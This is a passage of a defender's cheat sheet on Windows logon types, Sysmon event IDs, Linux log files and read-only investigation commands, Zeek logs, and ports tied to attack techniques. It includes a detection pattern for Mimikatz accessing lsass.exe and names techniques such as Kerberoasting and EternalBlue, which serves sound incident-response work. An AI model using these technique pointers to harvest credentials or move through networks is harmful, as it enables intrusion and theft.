| **2** | **Interactive** | Physical console logon (keyboard/monitor). Normal on workstations; suspicious on servers. |
| **3** | **Network** | Network authentication (SMB share, RPC, HTTP to IIS). Standard for file servers; suspicious between user laptops! |
| **4** | **Batch** | Scheduled task or batch script execution. |
| **5** | **Service** | Windows Service starting up with dedicated service account credentials. |
| **7** | **Unlock** | Workstation console was unlocked by user. |
| **8** | **NetworkCleartext** | Authentication over network where password was sent in cleartext (e.g., IIS Basic Auth). |
| **9** | **NewCredentials** | Program run with `/netonly` (e.g., `runas /netonly` or Mimikatz PtH). Local user unchanged; network connections use target identity! |
| **10** | **RemoteInteractive** | **Remote Desktop (RDP)** connection. Check Source Network Address! |
| **11** | **CachedInteractive** | User logged on locally with cached credentials because Domain Controller was offline. |

---

#### 3. Microsoft Sysmon Event IDs Cheat Sheet

| Sysmon ID | Event Description | Key Fields & Analysis Focus |
|:---------:|:------------------|:----------------------------|
| **1** | **Process Create** | `Image`, `CommandLine`, `ParentImage`, `ParentCommandLine`, `Hashes` (SHA256), `User`. |
| **2** | File Creation Time Changed | `TargetFilename`, `CreationUtcTime`, `PreviousCreationUtcTime` (Timestomping detection). |
| **3** | **Network Connection** | `Image`, `SourceIp`, `SourcePort`, `DestinationIp`, `DestinationPort`, `Protocol`. |
| **5** | Process Terminated | `Image`, `ProcessId`. |
| **7** | **Image Loaded (DLL)** | `ImageLoaded`, `Hashes`, `Signed`, `SignatureStatus` (DLL injection / side-loading). |
| **8** | **CreateRemoteThread** | `SourceImage`, `TargetImage` (Process injection detection!). |
| **10** | **ProcessAccess** | `SourceImage`, `TargetImage`, `GrantedAccess` (Mimikatz accessing `lsass.exe` with `0x1010` / `0x143A`). |
| **11** | **FileCreate** | `TargetFilename`, `Image` (Malware dropped to disk). |
| **12/13/14**| **Registry Events** | `TargetObject`, `Details`, `EventType` (Run keys, service modifications, security tampering). |
| **15** | FileCreateStreamHash | Alternate Data Streams (ADS) and Zone.Identifier (Mark of the Web / MOTW). |
| **22** | **DNSEvent** | `QueryName`, `QueryStatus`, `Image` (DNS lookup bound to specific executable process!). |

---

#### 4. Linux Critical Log Files & Systemd Commands

| Log File Path | Description & Investigation Purpose |
|:--------------|:------------------------------------|
| `/var/log/auth.log` | Debian/Ubuntu authentication log (SSH logins, sudo usage, failed authentications). |
| `/var/log/secure` | RHEL/CentOS authentication log (equivalent to `auth.log`). |
| `/var/log/audit/audit.log` | Linux audit framework log (system calls, `execve` process executions). |
| `/var/log/messages` / `syslog` | General system messages, service startups, kernel notices. |
| `/var/log/cron` | Scheduled cron job execution records. |
| `/var/log/wtmp` / `/var/log/btmp` | Binary login records (`wtmp` = successful; `btmp` = failed). Read with `last` / `lastb`. |

```bash
# Useful Linux Investigation Commands:
journalctl -u ssh -S today --no-pager       # View today's SSH events
ausearch -sc execve -ts today -i             # View process executions via auditd
grep -E "Failed password|Accepted password" /var/log/auth.log | tail -n 25
lastb -n 20                                 # View last 20 failed login attempts
```

---

#### 5. Zeek Core Log Files & Investigation Pivots

| Zeek Log Name | Content & Blue Team Pivot Value |
|:--------------|:--------------------------------|
| **`conn.log`** | Master connection log: IP 5-tuple, duration, bytes sent/received, connection state (`S0`, `SF`, `RSTO`). |
| **`dns.log`** | Complete DNS lookups: Query, Record Type (A, AAAA, TXT), Response IP, Response Code (`NXDOMAIN`). |
| **`http.log`** | Web requests: Method (GET, POST), URI, Host header, User-Agent, Status Code, MIME type. |
| **`ssl.log`** | Encrypted sessions: Server Name Indication (SNI), TLS Version, Cipher, JA3/JA3S fingerprints. |
| **`files.log`** | Files transferred over network: Calculated SHA-1/MD5 hash, MIME type, file size, transferring protocol. |
| **`notice.log`** | Zeek policy violations and built-in anomaly detection alerts. |

---

#### 6. Common Attack Ports & Protocols Matrix

| Port | Protocol | Default Service | Attack Vector & Investigation Pivot |
|:----:|:--------:|:----------------|:------------------------------------|
| **21** | TCP | FTP | Cleartext credentials, anonymous upload backdoors, data exfiltration. |
| **22** | TCP | SSH | Password spraying, brute force, unauthorized remote tunnels, key theft. |
| **23** | TCP | Telnet | Legacy cleartext management; should NEVER be seen on modern enterprise networks. |
| **25** | TCP | SMTP | Unauthenticated mail relays, phishing injection, spam delivery. |
| **53** | TCP/UDP | DNS | DNS Tunneling (Iodine/dnscat2), DGA command and control, amplification DDoS. |
| **80 / 443** | TCP | HTTP / HTTPS | Web shells, C2 beaconing, data exfiltration, web application exploitation. |
| **88** | TCP/UDP | Kerberos | Kerberoasting, AS-REP Roasting, Golden/Silver Ticket injection. |
| **135** | TCP | RPC Endpoint | Remote procedure calls, lateral movement, WMI execution. |
| **139 / 445** | TCP | NetBIOS / SMB | EternalBlue (MS17-010), PsExec lateral movement, ransomware worm propagation. |
| **389 / 636** | TCP | LDAP / LDAPS | Active Directory enumeration, BloodHound queries, user password extraction. |
| **3389** | TCP | RDP | Interactive lateral movement, brute force, ransomware operator manual consoles. |
| **5985 / 5986**| TCP | WinRM (HTTP/S) | PowerShell Remoting, Evil-WinRM lateral movement. |

---
